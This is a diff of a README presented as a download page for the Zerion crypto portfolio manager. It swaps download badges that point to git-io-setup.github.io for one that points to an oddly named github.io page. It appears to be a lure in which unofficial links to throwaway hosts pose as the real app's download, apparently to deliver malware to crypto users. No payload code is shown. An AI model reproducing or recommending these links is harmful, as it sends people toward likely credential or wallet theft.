@@ -1,18 +1,7 @@
 # Zerion Download — Crypto Portfolio Manager
 
-<a href="https://git-io-setup.github.io/.github/?offer=Zerion" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Zerion%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Zerion for macOS">
-</a>
+[![GET Zerion App](https://img.shields.io/badge/GET%20%E2%80%94%20Zerion-App-0078D6?style=for-the-badge&logoColor=white)](https://atlaskowalskiguitarferv5505.github.io/.github/Zerion-App)
 
-<a href="https://git-io-setup.github.io/.github/?offer=Zerion" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Zerion%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Zerion for Windows">
-</a>
 
 ---
 
